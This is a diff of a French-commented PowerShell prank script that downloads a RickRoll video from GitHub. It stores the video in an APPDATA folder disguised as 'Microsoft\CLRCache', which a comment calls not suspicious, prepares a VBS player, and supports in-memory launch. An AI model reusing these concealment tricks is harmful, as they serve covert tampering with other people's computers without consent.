@@ -4,17 +4,12 @@ $DEBUG = $true  # Mettre $false pour désactiver les logs
 $AppData = $env:APPDATA
 $LocalPath = Join-Path $AppData "Microsoft\CLRCache"    # dossier pas suspect
 
-# Gestion du dossier de script
+# Modification ici : gérer le cas où $MyInvocation.MyCommand.Path est nul
 if ($MyInvocation.MyCommand.Path) {
     $ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 } else {
     # fallback si lancé en mémoire : on met le dossier local par défaut
     $ScriptDir = $LocalPath
-}
-
-# Crée le dossier de logs (script dir) s'il n'existe pas
-if (-not (Test-Path $ScriptDir)) {
-    New-Item -ItemType Directory -Path $ScriptDir -Force | Out-Null
 }
 
 $VideoURL = "https://github.com/delete-user-56/RickRoll_OnStartup/raw/main/RickRoll.mp4"
@@ -25,11 +20,7 @@ function Log {
     param ($msg)
     if ($DEBUG) {
         $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        try {
-            Add-Content -Path $LogFile -Value "[$timestamp] $msg"
-        } catch {
-            Write-Host "Erreur écriture log : $_"
-        }
+        Add-Content -Path $LogFile -Value "[$timestamp] $msg"
     }
 }
 
@@ -45,8 +36,10 @@ try {
     $VideoPath = Join-Path $LocalPath "rr.mp4"
     $VbsPath = Join-Path $LocalPath "player.vbs"
 
-    # Télécharger la vidéo (avec attente de la fin de téléchargement)
-    if (-not (Test-Path $VideoPath) -or ((Get-Item $VideoPath).Length -lt 1000)) {
+    # Vérification sécurisée de l'existence et taille du fichier vidéo
+    $VideoExists = Test-Path $VideoPath
+
+    if (-not $VideoExists -or ((Get-Item $VideoPath).Length -lt 1000)) {
         Log "Starting download of video..."
         Invoke-WebRequest -Uri $VideoURL -OutFile $VideoPath -UseBasicParsing -ErrorAction Stop *> $null
         Log "Download finished."
